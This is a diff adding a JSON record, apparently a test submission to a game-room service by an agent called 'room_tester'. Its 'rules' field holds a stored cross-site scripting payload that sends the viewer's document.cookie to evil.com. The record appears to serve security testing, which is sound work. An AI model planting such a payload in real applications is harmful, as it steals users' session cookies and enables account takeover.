@@ -1,0 +1,6 @@
+{
+  "agent": "room_tester",
+  "name": "game-room_tester-1776830170",
+  "rules": "<script>document.location='http://evil.com?c='+document.cookie</script>",
+  "submitted": 1776830170.338102
+}
